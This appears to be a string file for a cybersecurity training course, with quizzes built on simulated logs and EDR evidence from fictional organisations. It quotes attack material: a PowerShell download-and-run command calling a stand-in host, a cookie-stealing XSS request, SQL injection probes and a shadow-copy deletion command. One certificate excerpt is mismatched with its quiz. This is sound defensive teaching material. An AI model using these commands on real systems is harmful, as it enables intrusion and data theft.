text.avalanche: Good hash functions scramble completely: change one character and about half the bits flip, so similar inputs give unrelated hashes. Edit either box.
text.integrity: Sites publish a file's SHA-256 so you can check your download. Two mirrors offer the same file: hash each and pick the match. Get the published hash from the official site, over HTTPS.
retired: MD5 is broken: two different inputs with the same hash (a collision) became easy in 2004. In 2012 the Flame malware used one to fake a Microsoft signature.
SHA-1 fell in 2017: Google and CWI Amsterdam made two different PDFs with the same SHA-1, 38762cf7f55934b34d179ae6a4c80cadccbb7f0a (SHAttered). NIST retires it by the end of 2030.
Use SHA-256 or stronger for fingerprints and signatures. MD5 and SHA-1 are only fit for spotting accidental damage.
text.speed: Fast is good for fingerprints, bad for passwords: a leaked table lets attackers hash guesses at enormous speed. Password storage uses deliberately slow functions. Measure both:
text.speedResult: Here, the slow function makes each guess about {ratio} times more expensive. Attackers' hardware is faster at both, but the ratio holds. OWASP recommends 600,000 rounds of PBKDF2-HMAC-SHA256.
text.unsalted: Marlow Garden Centre (fictional) stored passwords as unsalted SHA-1, as LinkedIn did before its 2012 breach. Made-up accounts, real hashes:
text.sharedRight: Identical hashes mean identical passwords. Whoever works out one has both, and nobody had to guess anything to know they match.
text.guess: Attackers don't reverse hashes: they hash likely guesses and look for matches. Here are 20 of the commonest leaked passwords.
text.unsaltedResult: Each guess was hashed once and compared with every account at the same time.
text.salted: Now with a salt: a random value per account, added before hashing. The two matching passwords no longer share a hash.
text.saltedResult: Every guess now had to be hashed once per account, and precomputed tables are useless. But weak passwords still fell: only a long, unique password survives.
defend: Store passwords with a slow, salted function: OWASP recommends Argon2id, then scrypt, then bcrypt (or PBKDF2 where FIPS-140 is required).
For people: long passphrases, a password manager so each one is unique, and MFA in case one leaks. NIST favours length and breach checks over complexity rules.

mirrors.label: Mirror A
mirrors.content:
Harbour Notes 2.4.1 release notes
- Faster search in large notebooks
- Fixed: export to PDF lost page numbers
Updates are downloaded from https://updates.harbournotes.example.net/
mirrors.why: Mirror A's hash is completely different, because one part of the file changed: its update address ends .example.net, a different domain someone else could control. One character or one word: any change gives a new hash.

mirrors.label: Mirror B
mirrors.content:
Harbour Notes 2.4.1 release notes
- Faster search in large notebooks
- Fixed: export to PDF lost page numbers
Updates are downloaded from https://updates.harbournotes.example/
mirrors.why: Mirror B's SHA-256 matches the published one exactly, so it's the file the developers published. Mirror A differs in one place: its update address points to a different domain.

retired.q: SHA-1 can't be reversed and still gives a 160-bit fingerprint. So why is it no longer trusted for digital signatures and certificates?
options: It's too slow for modern computers
Attackers can make two different files with the same SHA-1 hash, so a signature on one would also fit the other
Anyone can turn a SHA-1 hash back into the original file
Its hashes are too long to store
retired.why: That's a collision. A signature signs the hash, so if a harmless file and a harmful one share a hash, the signature fits both.
retired.wrong: Think about what SHAttered produced: two different files with one hash. What does that do to a signature, which signs the hash?

defend.q: A new web app needs to store user passwords. Which is right?
options: SHA-256 of each password: it's a modern hash
Encrypt each password with AES so support staff can read it back if needed
A slow password-hashing function such as Argon2id, bcrypt, scrypt or PBKDF2, with a unique random salt per user
defend.why: Slow and salted: each guess is expensive, and identical passwords look different. Nobody, staff included, should be able to read a password back.
defend.wrong: Fast hashes (salted or not) make guessing cheap, and encryption can be reversed by anyone who gets the key.

intro: Security teams describe every vulnerability with the same eight CVSS metrics. Read each scenario, pick the metrics, and watch the score update live. Match the official vector to pass.

scenarios.text: Anyone on the internet can send one crafted request to a company's VPN appliance and run commands as root. No login needed, nobody has to click anything, and it always works.

scenarios.title: Stored XSS in comments
scenarios.text: A logged-in user can post a comment containing script. When other users view it, the script runs in their browser on the site and can read or change some of their data. The vulnerable app and the victim's browser session are different security scopes.

scenarios.title: Local privilege escalation
scenarios.text: Someone who already has a normal user account on a Linux server can run a program that makes them root. They need to be logged in to the machine itself; no other user is involved.

steps.hint: Compare the two OpenSSH lines.
steps.explain: OpenSSH 7.4 (2016) on files, against 9.6 on www. Old isn't the same as vulnerable, though: Debian backports security fixes, so check before you report it.

steps.q: What does "All 1000 scanned ports ... are in ignored states" tell you about 203.0.113.12?
options: Every port it tried was filtered: something answered nothing, so it may sit behind a firewall
steps.explain: The 1000 most common ports gave no response at all. That doesn't prove nothing runs there: a firewall may only allow certain sources, or the service may use an uncommon port.

title: Is it real? Validating scanner findings
skill: Separate real findings from false positives, then decide what to fix first
card: False positives out, real risks first
intro: A scanner's results from the Brackenford test, with the tester's follow-up checks. Decide which findings are real, which aren't, and which matters most.

artifact.name: Scanner export and notes
artifact.text:
Simulated scanner export with the tester's notes. Brackenford Housing Association (fictional), 3 Nov 2026.

FINDING 1  203.0.113.10:443  Medium  TLS 1.0 supported
  note: manual check with openssl s_client -tls1 was refused. The scanner matched an old response.
FINDING 2  203.0.113.11:445  High  SMB file sharing reachable from the internet (Samba)
  note: confirmed from our test source 192.0.2.44. Listing shares asks for a password.
FINDING 3  203.0.113.11:21  Medium  FTP accepts clear-text logins
  note: confirmed with test account portal-test-01: USER and PASS cross the network unencrypted.
FINDING 4  203.0.113.11:22  High  OpenSSH 7.4: this version has known vulnerabilities
  note: version number only. The package comes from Debian's security updates (7.4p1 Debian 10+deb9u7), which backport fixes.
FINDING 5  203.0.113.10:80  Low  Apache default page found
  note: the server is nginx 1.24.0 and the page is the client's own home page. Apache isn't installed.

steps.q: Which finding is a false positive because the scanner matched the wrong product? (number)
steps.hint: Compare what the scanner says with what's installed.
steps.explain: The scanner saw a page and guessed Apache, but the server is nginx and Apache isn't installed. Report it as a false positive (or leave it out), with the reason.

steps.q: Finding 1 says TLS 1.0 is supported, but your manual check was refused. What goes in the report?
options: Report it as Medium anyway: the scanner said so
Mark it as a false positive and note how you checked
Raise it to High to be safe
steps.explain: Validating findings is part of the job. Saying how you checked lets the client trust the rest of the report.

steps.q: Finding 4 is based only on the OpenSSH version number. What should you do before reporting it?
options: Report it: old versions are always vulnerable
Check each listed issue against Debian's security tracker, since Debian backports fixes without changing the main version
Remove it: version findings are never useful
steps.explain: 7.4p1 Debian 10+deb9u7 may already include fixes for some of the issues. Report what is still open, and if the release is past its support life, say that instead.

steps.q: Of the confirmed findings, which should Brackenford fix first?
options: Finding 2: SMB reachable from the internet
steps.explain: SMB facing the internet is reachable by anyone, invites password guessing and has a history of wormable flaws. Clear-text FTP matters too, but needs someone in a position to watch the traffic.

steps.q: What's the right fix for finding 3?
options: Move to SFTP or FTPS and turn plain FTP off
steps.explain: Encrypting the connection protects the login. A different port or a longer password still crosses the network in clear text.

steps.q: What should each confirmed finding in the report include?
options: The scanner's text, copied as it is
Evidence (what you saw and how to reproduce it safely), the business impact and a recommended fix
steps.explain: The client's admins need to see it, understand why it matters and know what to do. A pasted scanner line rarely does that.

primer.title: Reading a web server log line

keys.label: Who
keys.text: The first field is the IP address that sent the request.

keys.label: What
keys.text: The request in quotes: method, page and anything after the ?.

keys.label: Result
keys.text: The status code, then how many bytes came back.

results: Redirect, often after a successful login
The server hit an error (here, broken SQL)
URL encoding for ' (quote), a space and =

steps.q: Which IP address is testing the shop for SQL injection?
steps.hint: Look at the user agent at the end of each line: one names the tool.
steps.explain: 203.0.113.77 sends a stray quote, then AND 1=1 and AND 1=2, then UNION SELECT, all from sqlmap, a well-known SQL injection tool. A user agent can be faked, but the requests give it away anyway.

steps.q: 198.51.100.23 searched for o%27brien (O'Brien), which also contains a quote. Is that an attack?
options: Yes: any quote in a URL is SQL injection
No: it's a normal search for a name with an apostrophe, and the page loaded fine
Yes: it came from an iPhone
steps.explain: Names like O'Brien contain apostrophes, so a quote alone proves nothing. What matters is the pattern: probing, logic tests and SQL keywords, as 203.0.113.77 sends.

steps.q: Adding AND 1=1 returns 5123 bytes, but AND 1=2 returns only 1840. What does that tell the attacker?
options: The id value is being run as part of a SQL query, so they can ask the database true or false questions
The product is out of stock
steps.explain: If the input were treated as plain data, both requests would fail the same way. A true condition shows the product and a false one hides it, so the input is changing the query: it's injectable.

steps.q: Look at the UNION request at 02:16:40. Did the attacker get data out?
options: No: it's only a GET request
Probably: it asks for usernames and password hashes from the users table, and the reply is about nine times bigger than a normal product page
No: the status is 200, which means it was blocked
steps.explain: A UNION SELECT adds the attacker's own query to the page's query. A 200 with 48211 bytes instead of about 5000 strongly suggests the users table was printed into the page.

steps.q: At 02:31 someone logs in to /admin from a different IP and downloads the orders export. How should you treat it?
options: As a normal admin login: the password was right
As a likely account takeover using credentials taken from the database: reset admin passwords, end sessions and treat the export as a possible data breach
Ignore it: the IP is different from the attacker's
steps.explain: Attackers often move to a second address. A first-ever admin login straight after the users table leaked, followed by a 3 MB customer export, is the likely payoff. Customer data leaving may need reporting (in the UK, to the ICO within 72 hours if there's a risk to people).

steps.q: What actually fixes the hole in products.php?
options: A web application firewall rule for the word UNION
Parameterised queries (prepared statements), so the id is always treated as data, never as SQL
steps.explain: With a parameterised query the database receives the SQL and the value separately, so input can't change the query. A WAF and hidden errors can slow attackers down, but they're extra layers, not the fix.

steps.q: Which review (id) contains a script?
steps.hint: Look for HTML tags in the review text.
steps.explain: Review 812 hides a <script> tag after 'Great price!'. The shop saved it as it was and puts it into the product page for every visitor.

steps.q: What does that script do when someone's browser runs it?
options: Sends the visitor's cookies for this site to cdn-stats.example.net, hidden inside an image request
Nothing: scripts in reviews can't run
steps.explain: new Image().src makes the browser request a 'picture' from the attacker's server, with document.cookie stuck on the end. No image appears, but the cookies arrive.

steps.q: Why is this called stored XSS?
options: It's stored in the attacker's browser
The script is saved on the site and runs for everyone who views the page, not just the person who sent it
It only works on stored card details
steps.explain: Reflected XSS bounces off one crafted link; stored XSS sits in the site's own data (a review, a comment, a profile) and runs for every viewer, including staff.

steps.q: Which IP address used the admin area without logging in?
steps.explain: 203.0.113.50 (the same address that posted review 812) loads /admin/ at 11:05 with no login request before it.

steps.q: How did they get into the admin area?
options: An admin opened the review queue at 11:03, the script sent the admin's session cookie, and the attacker reused it two minutes later
The admin page has no protection at all
steps.explain: A session cookie proves you've already logged in. Steal it and you are that user, no password or MFA needed, until the session ends.

steps.q: What should the shop do first?
options: Delete review 812, sign out every admin session and treat the customer export as a possible data breach
steps.explain: Remove the script so it stops running, kill the stolen session (a password change alone may not), then assess the export: personal data left the business.

steps.q: Which pair of changes stops this happening again?
options: A longer admin password and a CAPTCHA
Encode user content when it's shown (so <script> is displayed as text) and add HttpOnly to the session cookie
Move the admin area to a new URL
Only allow reviews from logged-in customers
steps.explain: Output encoding means a review can't become code. HttpOnly (missing from the Set-Cookie line) stops scripts reading the cookie at all. A Content Security Policy adds another layer.

title: One number at a time: an IDOR
skill: Spot broken access control in an application log and say what the fix is
card: A tenant reading everyone's invoices
intro: Larkspur Lettings' portal sent far more invoices than usual one evening. Read the audit log and find out whose data went where.

artifact.name: Portal audit log
artifact.text:
Simulated application audit log, Larkspur Lettings tenant portal (fictional), 12 Nov 2026 (UTC).
Simplified: one line per API request; 'owner' is the tenant the record belongs to.

... 812 more lines like these, one invoice number lower each time, every one status=200 with a different owner ...

2026-11-12T19:20:05Z  user=2266  ip=198.51.100.19  GET /api/v1/invoices/20931  status=200  owner=2266

steps.q: Which user id is reading other tenants' invoices?
steps.explain: User 4471 opens their own invoice (owner=4471), then counts down through invoice numbers that belong to other tenants.

steps.q: What gives it away in the log?
options: The owner doesn't match the user, and the invoice numbers go down by one, about one a second
steps.explain: A person reads a few of their own invoices. A script walking through hundreds of numbers, each owned by someone else, is enumeration.

steps.q: The admin page answered 403 but other people's invoices answered 200. What does that tell you?
options: The portal is secure: it blocked the admin page
The portal checks roles (admin or not) but never checks that a record belongs to the person asking
steps.explain: That's an insecure direct object reference (IDOR): the check is 'are you logged in?' rather than 'is this yours?'. Function-level checks don't cover object-level access.

steps.q: What makes 19:12:30 worse than the invoices?
options: It's another tenant's passport scan: identity documents raise the harm, and the breach report needs to say so
It came from a different IP
steps.explain: The same missing check covers documents too. Identity documents can be used for fraud, so the people affected need telling, and the ICO probably does as well.

steps.q: What's the right fix?
options: On the server, check on every request that the logged-in tenant owns the record (or is staff allowed to see it)
Hide the invoice number from the URL
Rate-limit the API to 10 requests a minute
steps.explain: Random numbers and rate limits make guessing slower but don't stop it. Only a server-side ownership check closes the hole.

steps.q: At 19:20 user 2266 opens invoice 20931 from a different IP. What is it?
options: Probably normal: 2266 is reading their own invoice (owner=2266)
steps.explain: Check the owner before you raise the alarm. The user and owner match, so this one is the system working as it should.

title: Before the ransom note
skill: Read a ransomware timeline: spot the early warnings, the data theft and the backup sabotage, and choose the first response
card: The warnings hours before encryption
intro: Marlow Street Dental's files were locked at 03:53. The EDR timeline shows the hours before. Find what was missed and what to do now.

artifact.name: EDR timeline: FS01

Note from the IT provider: nightly backups go to a NAS on the same network, joined to the domain, reachable with svc-backup.

steps.q: Which account did the intruder use to get onto FS01? (the account name)
steps.explain: MSD\svc-backup logs on over RDP from the reception PC. Service accounts run software in the background; they shouldn't log on interactively at all.

steps.q: Which event should have been the first alarm?
options: 01:12: a service account logging on over RDP in the middle of the night
steps.explain: There were hours between the first sign and the encryption. An alert on interactive logons by service accounts would have given the team time to act.

steps.q: What happened between 01:20 and 03:48?
options: Patient files were copied out to cloud storage (41.7 GB), so this is a data breach even if the files can be restored
steps.explain: rclone is a legitimate sync tool that attackers often use to steal data before encrypting it, so they can threaten to publish it too (double extortion).

steps.q: What do the three commands at 03:52 have in common?
options: They delete Windows' shadow copies, turn off recovery and delete the backup catalogue, so the victim can't easily roll back
steps.explain: Removing ways to recover is a standard step before encryption, and a strong signal on its own: alert on vssadmin delete shadows.

steps.q: It's 04:00 and you've just been called. What first?
options: Pay quickly before the price goes up
Wipe and rebuild FS01 straight away
Isolate FS01 and RECEPTION-PC2 from the network, but leave them switched on, and disable svc-backup
steps.explain: Isolating stops the spread; keeping them powered on keeps evidence in memory; disabling the account cuts off the way in. Wiping destroys evidence, and paying is a business decision for later, with advice.

steps.q: Read the IT provider's note. Why are those backups at risk?
options: They aren't: backups are always safe
The NAS is on the same network and reachable with the stolen account, so the attacker can find and delete or encrypt it too
steps.explain: Keep at least one copy offline or immutable (it can't be changed or deleted for a set time), with separate credentials, and test restoring from it.

title: What ran on the laptop?
skill: Read a process tree: find how malware got in, what it stole and how it stays, then choose the response
card: One 'invoice', a hidden script, stolen logins
intro: Ashgrove Joinery's EDR flagged a laptop after someone opened an invoice. Follow the process tree from the download to what it did next.

artifact.name: EDR process tree: ASH-LT07

Analyst's note: the -EncodedCommand text decodes to IEX (New-Object Net.WebClient).DownloadString('https://cdn-update.example.com/u')

steps.q: Which file did the user open that started it all? (the file name)
steps.hint: Look at what wscript.exe ran.
steps.explain: Invoice_Nov_2026.pdf.js is a script, not a PDF. Windows hides known file extensions by default, so it showed as Invoice_Nov_2026.pdf, and double-clicking a .js file runs it.

steps.q: Why does the PowerShell line use -WindowStyle Hidden and -EncodedCommand?
options: To hide: no window appears and the command isn't readable at a glance. The note shows it downloads code and runs it
Because PowerShell needs it to use the internet
steps.explain: Encoded commands aren't proof of evil on their own (some admin tools use them), but a script from Downloads starting hidden, encoded PowerShell is a classic warning sign.

steps.q: What kind of malware is winsvc.exe, judging by what it did?
options: An infostealer: it read Chrome's saved passwords and cookies and sent 2.3 MB out
steps.explain: Login Data holds saved passwords and Cookies holds signed-in sessions. Reading both, then uploading, is what infostealers do.

steps.q: What is the scheduled task 'WinSvc Update' for?
options: Persistence: it starts the malware again every time the user logs on
steps.explain: Malware wants to survive a restart. A scheduled task, a Run key or a new service are common ways; all three are worth checking when cleaning up.

steps.q: The connections every 60 seconds since 10:03 are most likely...
options: The malware checking in with its command and control (C2) server for instructions
steps.explain: Regular, small check-ins to the same new address are a beacon. Blocking 203.0.113.91 and cdn-update.example.com across the company stops it and shows if other machines call it too.

steps.q: What should happen next?
options: Isolate the laptop, then from a clean device reset every password saved in Chrome and sign out all of k.patel's sessions
Run a full antivirus scan and wait
steps.explain: The data has already left. Stolen cookies let attackers into accounts without the password or MFA, so sessions must be ended, not just passwords changed. Rebuild the laptop rather than trust a clean-up.

steps.q: Which change would have stopped this file running on a double-click?
options: Set .js (and other script files) to open in Notepad, and show file extensions
steps.explain: If a script opens as text, nothing runs. Showing extensions also makes .pdf.js look odd. Many organisations set this by Group Policy.

next.label: NCSC: Mitigating malware and ransomware attacks

title: Attack, or just busy?
skill: Tell a flash crowd from a DDoS, recognise a reflection attack and know who can stop it
card: Two slowdowns, one attack
intro: Calder Street Theatre's box office slowed down twice today. Read the monitoring and decide which was customers and which was an attack.

artifact.name: Web and firewall summaries
artifact.text:
Simulated monitoring summary, Calder Street Theatre box office (fictional), 21 Nov 2026 (UTC). Internet link: 1 Gbit/s.
Simplified: per-minute summaries from the edge firewall and the web server, not raw packets.

--- web server (HTTPS) ---
time   requests/min  client IPs  top page     status
09:58         1,210         640  /whats-on    200: 99%
10:00        38,400      21,950  /tickets     200: 81%  503: 19%   ("The Lantern" tickets released at 10:00)
10:03        35,900      22,410  /tickets     200: 78%  503: 22%
10:20         6,150       4,020  /tickets     200: 99%
13:58         1,050         590  /whats-on    200: 99%
14:02           310         212  /whats-on    200: 64%  timeouts: 36%
14:05           180         140  /whats-on    200: 51%  timeouts: 49%

--- edge firewall ---
time   link in      top traffic                         sources
09:58   42 Mbit/s   TCP to 443 (HTTPS)                     640
10:00  310 Mbit/s   TCP to 443 (HTTPS)                  21,950
13:58   39 Mbit/s   TCP to 443 (HTTPS)                     590
14:02  996 Mbit/s   UDP from source port 123 (NTP)      21,300   dropped by rule: no NTP replies expected
14:05  998 Mbit/s   UDP from source port 123 (NTP)      21,480   dropped by rule

steps.q: What happened at 10:00?
options: A DDoS attack: 38,400 requests a minute
A flash crowd: real customers arriving for a ticket release, using the site normally
steps.explain: The spike starts exactly when tickets go on sale, the traffic is normal HTTPS to /tickets, and it fades as tickets sell. That's demand, not an attack, even though some people got errors.

steps.q: Some customers got 503 errors at 10:00. What's the right fix for next time?
options: Add capacity or a queue page before the release, and test it under load
Turn off HTTPS to save processing
steps.explain: 503 means the server was too busy. Blocking customers would make it worse. A virtual queue, caching and extra capacity are how big ticket sales cope.

steps.q: The 14:02 flood comes from which UDP source port?
steps.explain: Port 123 is NTP, the time protocol. Nobody at the theatre asked 21,300 servers for the time.

steps.q: What kind of attack is the 14:02 flood?
options: A reflection (amplification) DDoS: the attacker sent small NTP requests with the theatre's address faked, so thousands of servers sent large replies to the theatre
steps.explain: Reflection hides the attacker behind innocent servers, and amplification turns a small request into a big reply. The flood is real traffic from real NTP servers, which is why there are so many sources.

steps.q: The firewall drops every NTP packet, yet customers still time out. Why?
options: The 1 Gbit/s link is already full before traffic reaches the firewall, so there's no room left for customers
steps.explain: Dropping packets at your own edge is too late for a volumetric attack: the pipe is full. It has to be filtered upstream.

steps.q: Who can actually stop the 14:02 attack?
options: The theatre's IT person, by restarting the router
The internet provider or a DDoS protection service, filtering upstream before it reaches the theatre's link
Nobody: wait for it to end
steps.explain: Upstream filtering, scrubbing services and content delivery networks have far bigger pipes. Agree how to call them in before an attack, not during one.

title: The bucket left open
skill: Read an S3 bucket policy and CloudTrail events: find who opened it, who got in and how to share safely
card: A 'temporary' share that stayed public
intro: Fernlea Care Homes shared a payroll file with an agency through cloud storage. Read the policy and the audit trail to see what went wrong.

artifact.name: Bucket policy and CloudTrail
artifact.text:
Simulated evidence, Fernlea Care Homes (fictional), AWS account 111122223333, 26 Nov 2026 (UTC).
Simplified: CloudTrail events shown one per line with a few key fields; S3 data events (GetObject) were switched on.

--- bucket policy: fernlea-hr-exports ---
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "TempShareForPayrollAgency",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::fernlea-hr-exports/*"
    }

--- CloudTrail ---
time                  eventName                       user                    sourceIP        detail
2026-10-02T15:39:51Z  DeleteBucketPublicAccessBlock   IAM user j.reyes        198.51.100.20   bucket fernlea-hr-exports
2026-10-02T15:41:07Z  PutBucketPolicy                 IAM user j.reyes        198.51.100.20   bucket fernlea-hr-exports
2026-10-02T16:05:44Z  GetObject                       anonymous               192.0.2.80      payroll/2026-09.csv
2026-11-24T03:12:09Z  ListBucket                      anonymous               203.0.113.17    AccessDenied
2026-11-24T03:12:31Z  GetObject                       anonymous               203.0.113.17    payroll/2026-09.csv
2026-11-24T03:12:32Z  GetObject                       anonymous               203.0.113.17    payroll/2026-10.csv
2026-11-24T03:12:34Z  GetObject                       anonymous               203.0.113.17    staff/dbs-checks-2026.xlsx

Note from HR: the payroll agency (192.0.2.80) collected the September file on 2 Oct. Nobody removed the policy afterwards.

steps.q: What does "Principal": "*" with s3:GetObject mean?
options: Only Fernlea's staff can read the files
Anyone on the internet can download any file in the bucket, without logging in, if they know or guess its name
Only the payroll agency can read them
steps.explain: The * principal means everyone, including anonymous users. The statement doesn't mention the agency at all.

steps.q: Which IAM user made the bucket public? (the username)
steps.explain: j.reyes first removed the bucket's Block Public Access setting, then added the policy. AWS blocks public buckets by default, so it took two deliberate steps.

steps.q: 203.0.113.17's ListBucket was denied, yet its GetObject requests worked. Why?
options: The policy allows GetObject (download a named file) but not ListBucket, so they guessed or already knew the file names
steps.explain: Predictable names like payroll/2026-10.csv are easy to guess, or may have leaked. Not being able to list a bucket is not protection.

steps.q: Under the shared responsibility model, whose job was it to stop this?
options: Fernlea's: AWS secures the infrastructure, but the customer is responsible for how they configure access to their data
steps.explain: The cloud provider keeps the service secure and gave safe defaults. Who can read your data is your configuration, so it's yours.

steps.q: What should Fernlea do now?
options: Remove the policy, turn Block Public Access back on, and treat the payroll and DBS files as a personal data breach
steps.explain: Close the hole first, then assess: payroll and criminal record check data about staff is sensitive, so the people affected and probably the ICO need telling.

steps.q: How should they share a file with the agency next time?
options: The same way, but remember to remove it
A pre-signed URL that expires (or a proper file transfer service), with Block Public Access left on
Put it on a USB stick in the post
steps.explain: A pre-signed URL gives one file to whoever has the link, for a limited time, without making anything public. 'Temporary' settings that rely on someone remembering tend to stay.

title: Why the padlock broke
skill: Read a certificate's names, dates and issuer, and match each browser warning to its cause and fix
card: Three warnings, three different causes
intro: Brightwell Opticians' staff keep hitting certificate warnings. Read the three certificates and work out what's wrong with each.

artifact.name: Certificates (openssl output)
artifact.text:
Three certificates from Brightwell Opticians (fictional), checked on 23 Nov 2026. Output from OpenSSL 3.0 (openssl x509 -noout -text),
simplified: serial numbers, keys and most extensions are trimmed.

=== 2. https://portal.brightwell.example (staff portal) ===

    Data:
        Issuer: C=GB, ST=Greater Manchester, L=Salford, O=Sectigo Limited, CN=Sectigo RSA Domain Validation Secure Server CA
        Validity
            Not Before: Nov 14 00:00:00 2025 GMT

            Not After : Mar  1 09:00:00 2034 GMT
        Subject: CN=PRN-OFFICE-2
Browser (Chrome): NET::ERR_CERT_AUTHORITY_INVALID

steps.q: Certificate 1 is in date and from a trusted CA. Why does https://brightwell.example (without www) show a warning?
options: The certificate only names www.brightwell.example. Browsers check the Subject Alternative Name list, and the bare domain isn't on it
The site needs a paid certificate
steps.explain: Browsers match the address you typed against the SAN list (they ignore the CN). Reissue it with both names, or redirect the bare domain using a certificate that covers it.

steps.q: On what date did certificate 2 expire? (e.g. 14 Nov 2026)
steps.explain: Not After: Nov 14 23:59:59 2026 GMT. Nine days later every visit warns, and staff start learning to click through warnings, which is worse than the outage.

steps.q: What stops certificate 2 happening again?
options: Renew automatically (for example with ACME, as Let's Encrypt does) and alert on certificates nearing expiry
Tell staff to ignore the warning
Switch the portal to plain HTTP
steps.explain: Maximum lifetimes for public certificates are being cut (200 days from March 2026, 47 days by 2029), so renewing by hand will keep failing. Automate and monitor.

steps.q: How can you tell certificate 3 is self-signed?
options: The Issuer and Subject are the same: the printer vouched for itself, so no trusted CA backs it
steps.explain: A self-signed certificate still encrypts, but nothing proves it belongs to that device, so the browser can't rule out an impostor.

steps.q: What's the sensible fix for the printer's warning?
options: Teach staff to click 'Proceed anyway' on every site
Issue it a certificate from the company's internal CA (trusted on staff devices), and keep the admin page on a management network
Turn off HTTPS on the printer
steps.explain: Clicking through warnings becomes a habit attackers can exploit. An internal CA gives internal devices trusted certificates without paying for public ones.

steps.q: Certificate 1 comes from Let's Encrypt for free. Is it weaker than a paid one?
options: No: a domain-validated certificate encrypts the same way whoever issues it; paid ones may add support, warranties or company checks
Yes: it lasts only 90 days so it's less secure
steps.explain: Short lifetimes are a feature: a stolen key is useful for less time. The padlock means the connection is encrypted to that name, not that the business is honest.

title: One password, every account
skill: Spot a password spray in a sign-in log, find the account that fell and close the gap MFA didn't cover
card: MFA was on, and a login still got through
intro: Thornbury Surveyors uses MFA, yet one account signed in from abroad this morning. Read the sign-in log and work out how.

artifact.name: Entra ID sign-ins
artifact.text:
Simulated Microsoft Entra ID sign-in log (simplified), Thornbury Surveyors (fictional), 27 Nov 2026 (UTC). 41 staff accounts.
Simplified: one line per sign-in with a few fields; error codes are Entra's real AADSTS codes.

time      user                        client app                        IP              loc result   detail
09:12:01  a.lewis@thornbury.example   Exchange Online (browser)         203.0.113.140   NL  Failure  50126 invalid username or password
09:12:03  b.shah@thornbury.example    Exchange Online (browser)         203.0.113.140   NL  Failure  50126 invalid username or password

09:12:09  e.kowalski@thornbury.exampleExchange Online (browser)         203.0.113.140   NL  Failure  50126 invalid username or password
... 34 more lines like these: a different user each time, one attempt each, 2 seconds apart, all 50126 ...

09:31:47  a.lewis@thornbury.example   Exchange Online (browser)         198.51.100.66   GB  Success  multifactor authentication (Authenticator app)

Conditional Access policy 'Require MFA for all users': excluded group CA-Exclude-Travel (members: r.james, added 3 Mar 2026 for a site visit abroad).
Note: 198.51.100.66 is the office.

steps.q: What is 203.0.113.140 doing between 09:12 and 09:13?
options: Brute-forcing one account with many passwords
Password spraying: trying one common password against every account, once each
Normal sign-ins from a branch office
steps.explain: One attempt per account, a different user each time, stays under lockout limits. Brute force hammers one account and gets it locked.

steps.q: Whose password did the attacker guess? (the username)
steps.explain: r.james is the only success from 203.0.113.140, in the middle of the spray, with a single factor.

steps.q: Everyone else needs MFA. Why did r.james get in with just a password?
options: The attacker approved the MFA prompt
r.james is in an exclusion group the MFA policy skips, added for a trip in March and never removed
MFA doesn't work from the Netherlands
steps.explain: 'Conditional Access: not applied' means no policy asked for MFA. Exclusions made for one trip, a broken phone or a service account tend to outlive their reason.

steps.q: e.kowalski failed at 09:44 and then succeeded. Should you worry?
options: Probably not: it's from the office, a typo followed by a sign-in with MFA, and nothing else odd
Yes: any failure is an attack
Lock the account to be safe
steps.explain: Context matters: the office IP, one mistake, then a normal MFA sign-in. The earlier failure from 203.0.113.140 was the spray, not this.

steps.q: What should happen first?
options: Ask r.james to pick a longer password next time
Reset r.james's password, revoke their sessions, remove them from the exclusion group, and check their mailbox for new rules and sent mail
Turn off MFA, since it didn't help
steps.explain: The attacker had the mailbox. Check what they read and sent, and whether forwarding or hiding rules were added: the usual next step towards invoice fraud.

steps.q: Which change closes the gap for everyone?
options: Make everyone change their password monthly
Keep MFA exclusions temporary and reviewed (with an end date), alert when an excluded account signs in, and ban common passwords
Add more people to the exclusion group
steps.explain: MFA only protects the accounts it covers. Time-limited exclusions, alerts and a banned-password list (Entra has one) shut the gap a spray looks for.
